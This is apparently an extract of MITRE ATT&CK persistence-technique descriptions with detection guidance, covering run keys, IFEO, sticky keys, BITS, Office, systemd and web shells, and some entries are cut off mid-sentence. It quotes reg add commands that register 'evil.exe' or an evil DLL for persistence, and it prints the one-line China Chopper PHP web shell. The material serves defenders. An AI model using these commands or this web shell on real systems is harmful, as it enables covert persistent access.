        <code>~/.bash_profile</code> and <code>~/.bashrc</code> are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), <code>~/.bash_profile</code> is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, <code>~/.bashrc</code> is executed. This allows users more fine grained control over when they want certain commands executed.

        Mac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.

        These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  (Citation: amnesia malware).

        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

        * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
        * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
        * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
        * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

      description: "Adversaries may steal the credentials of a specific user or service
        account using Credential Access techniques or capture credentials earlier
        in their reconnaissance process through social engineering for means of gaining
        Initial Access. \n\nAccounts that an adversary may use can fall into three
        categories: default, local, and domain accounts. Default accounts are those
        that are built-into an OS such as Guest or Administrator account on Windows
        systems or default factory/provider set accounts on other types of systems,
        software, or devices. Local accounts are those configured by an organization
        for use by users, remote support, services, or for administration on a single
        system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts
        are those managed by Active Directory Domain Services where access and permissions
        are configured across systems and services that are part of that domain. Domain
        accounts can cover users, administrators, and services.\n\nCompromised credentials
        may be used to bypass access controls placed on various resources on systems
        within the network and may even be used for persistent access to remote systems
        and externally available services, such as VPNs, Outlook Web Access and remote
        desktop. Compromised credentials may also grant an adversary increased privilege
        to specific systems or access to restricted areas of the network. Adversaries
        may choose not to use malware or tools in conjunction with the legitimate
        access those credentials provide to make it harder to detect their presence.\n\nDefault
        accounts are also not limited to Guest and Administrator on client machines,
        they also include accounts that are preset for equipment such as network devices
        and computer applications whether they are internal, open source, or COTS.
        Appliances that come preset with a username and password combination pose
        a serious threat to organizations that do not change it post installation,
        as they are easy targets for an adversary. Similarly, adversaries may also
        utilize publicly disclosed private keys, or stolen private keys, to legitimately
        connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021)
        (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials,
        and permissions across a network of systems is of concern because the adversary
        may be able to pivot across accounts and systems to reach a high level of
        access (i.e., domain or enterprise administrator) to bypass access controls
        set within the enterprise. (Citation: TechNet Credential Theft)"

      description: "The Microsoft Windows Application Compatibility Infrastructure/Framework
        (Application Shim) was created to allow for backward compatibility of software
        as the operating system codebase changes over time. For example, the application
        shimming feature allows developers to apply fixes to applications (without
        rewriting code) that were created for Windows XP so that it will work with
        Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework,
        shims are created to act as a buffer between the program (or more specifically,
        the Import Address Table) and the Windows OS. When a program is executed,
        the shim cache is referenced to determine if the program requires the use
        of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179)
        to redirect the code as necessary in order to communicate with the OS. \n\nA
        list of all shims currently installed by the default Windows installer (sdbinst.exe)
        is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows
        nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases
        are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n*
        <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo
        keep shims secure, Windows designed them to run in user mode so they cannot
        modify the kernel and you must have administrator privileges to install a
        shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)
        (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data
        Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),
        and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179),
        utilizing these shims may allow an adversary to perform several malicious
        acts such as elevate privileges, install backdoors, disable defenses like
        Windows Defender, etc."

        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)

        Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

        Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.

        Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.

        Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)

        Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).

        When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

        System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. For example:
        * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
        * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
        * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

        The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)

      description: |-
        To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

        Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.

        ### Windows

        Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.

        ### Linux/Mac

        Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.

        ### Mac

        Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).
        Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

        (API) functions to perform tasks that require reusable system resources. Windows
        API functions are typically stored in dynamic-link libraries (DLLs) as exported

        may use hooking to load and execute malicious code within the context of another
        process, masking the execution while also allowing access to the process's
        memory and possibly elevated privileges. Installing hooking mechanisms may
        also provide Persistence via continuous invocation when the functions are
        called through normal use.\n\nMalicious hooking mechanisms may also capture

        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

      description: "Per Apple’s developer documentation, when macOS and OS X boot
        up, launchd is run to finish system initialization. This process loads the
        parameters for each launch-on-demand system-level daemon from the property
        list (plist) files found in <code>/System/Library/LaunchDaemons</code> and
        <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons).
        These LaunchDaemons have property list files which point to the executables
        that will be launched (Citation: Methods of Mac Malware Persistence).\n \nAdversaries
        may install a new launch daemon that can be configured to execute at startup
        by using launchd or launchctl to load a plist into the appropriate directories
        (Citation: OSX Malware Detection). The daemon name may be disguised by using
        a name from a related operating system or benign software  (Citation: WireLurker).
        Launch Daemons may be created with administrator privileges, but are executed
        under root privileges, so an adversary may also use a service to escalate
        privileges from administrator to root.\n \nThe plist file permissions must
        be root:wheel, but the script or program that it points to has no such requirement.
        So, it is possible for poor configurations to allow an adversary to modify
        a current Launch Daemon’s executable and gain persistence or Privilege Escalation."

        On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ### cron

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        ### at

        The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ### launchd

        Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

        ### Windows

        Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

        If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

        ### Mac

        Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

        Monitor service creation through changes in the Registry and common utilities using command-line invocation. Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017) (Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templated, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.

        Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins. (Citation: MRWLabs Office Persistence Add-ins)

        Non-standard process execution trees may also indicate suspicious or malicious behavior. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.

        For the Outlook rules and forms methods, Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

      description: "Microsoft Office is a fairly common application suite on Windows-based
        operating systems within an enterprise network. There are multiple mechanisms
        that can be used with Office for persistence when an Office-based application
        is started.\n\n### Office Template Macros\n\nMicrosoft Office contains templates
        that are part of common Office applications and are used to customize styles.
        The base templates within the application are used each time an application
        starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic
        for Applications (VBA) macros (Citation: MSDN VBA in Office) can inserted
        into the base templated and used to execute code when the respective Office
        application starts in order to obtain persistence. Examples for both Word
        and Excel have been discovered and published. By default, Word has a Normal.dotm
        template created that can be modified to include a malicious macro. Excel
        does not have a template file created by default, but one can be added that
        will automatically be loaded. (Citation: enigma0x3 normal.dotm) (Citation:
        Hexacorn Office Template Macros)\n\nWord Normal.dotm location:<code>C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel
        Personal.xlsb location:<code>C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAn
        adversary may need to enable macros to execute unrestricted depending on the
        system or enterprise security policy on use of macros.\n\n### Office Test\n\nA
        Registry location was found that when a DLL reference was placed within it
        the corresponding DLL pointed to by the binary path would be executed every
        time an Office application is started (Citation: Hexacorn Office Test)\n\n<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office
        test\\Special\\Perf</code>\n\n### Add-ins\n\nOffice add-ins can be used to
        add functionality to Office programs. (Citation: Microsoft Office Add-ins)\n\nAdd-ins
        can also be used to obtain persistence because they can be set to execute
        code when an Office application starts. There are different types of add-ins
        that can be used by the various Office products; including Word/Excel add-in
        Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins,
        automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO)
        add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation:
        FireEye Mail CDS 2018)\n\n### Outlook Rules, Forms, and Home Page\n\nA variety
        of features have been discovered in Outlook that can be abused to obtain persistence,
        such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub)
        \n\nOutlook rules allow a user to define automated behavior to manage email
        messages. A benign rule might, for example, automatically move an email to
        a particular folder in Outlook if it contains specific words from a specific
        sender. Malicious Outlook rules can be created that can trigger code execution
        when an adversary sends a specifically crafted email to that user.(Citation:
        SilentBreak Outlook Rules)\n\nOutlook forms are used as templates for presentation
        and functionality in Outlook messages. Custom Outlook Forms can be created
        that will execute code when a specifically crafted email is sent by an adversary
        utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\nOutlook
        Home Page is a legacy feature used to customize the presentation of Outlook
        folders. This feature allows for an internal or external URL to be loaded
        and presented whenever a folder is opened. A malicious HTML page can be crafted
        that will execute code when loaded by Outlook Home Page.(Citation: SensePost
        Outlook Home Page)\n\nTo abuse these features, an adversary requires prior
        access to the user’s Outlook mailbox, either via an Exchange/OWA server or
        via the client application. Once malicious rules, forms, or Home Pages have
        been added to the user’s mailbox, they will be loaded when Outlook is started.
        Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded
        while malicious rules and forms will execute when an adversary sends a specifically
        crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation:
        SensePost Outlook Forms)(Citation: SensePost Outlook Home Page)"

        File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like "Knock Knock" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

        Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

        Changes to these locations typically happen under normal conditions when legitimate software is installed.

        Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

        The following run keys are created by default on Windows systems:
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

        The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

        The following Registry keys can be used to set startup folder items for persistence:
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

        Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

        Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

        * Event ID 106 - Scheduled task registered
        * Event ID 140 - Scheduled task updated
        * Event ID 141 - Scheduled task removed

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.

        An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).

        Systemd service unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>/home/<username>/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.

        Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.

        Auditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.

      description: "Systemd services can be used to establish persistence on a Linux
        system. The systemd service manager is commonly used for managing background
        daemon processes (also known as services) and other system resources.(Citation:
        Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd
        29SEP2018) Systemd is the default initialization (init) system on many Linux
        distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora
        15, and replaces legacy init systems including SysVinit and Upstart while
        remaining backwards compatible with the aforementioned init systems.\n\nSystemd
        utilizes configuration files known as service units to control how services
        boot and under what conditions. By default, these unit files are stored in
        the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code>
        directories and have the file extension <code>.service</code>. Each service
        unit file may contain numerous directives that can execute system commands.
        \n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution
        of commands when a services is started manually by 'systemctl' or on system
        start if the service is set to automatically start. \n* ExecReload directive
        covers when a service restarts. \n* ExecStop and ExecStopPost directives cover
        when a service is stopped or manually by 'systemctl'.\n\nAdversaries have
        used systemd functionality to establish persistent access to victim systems
        by creating and/or modifying service unit files that cause systemd to execute
        malicious commands at recurring intervals, such as at system boot.(Citation:

        typically require root privileges to create/modify service unit files in the
        <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code>
        directories, low privilege users can create/modify service unit files in directories
        such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation:

        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)

        <code><?php @eval($_POST['password']);></code>

        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)

        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

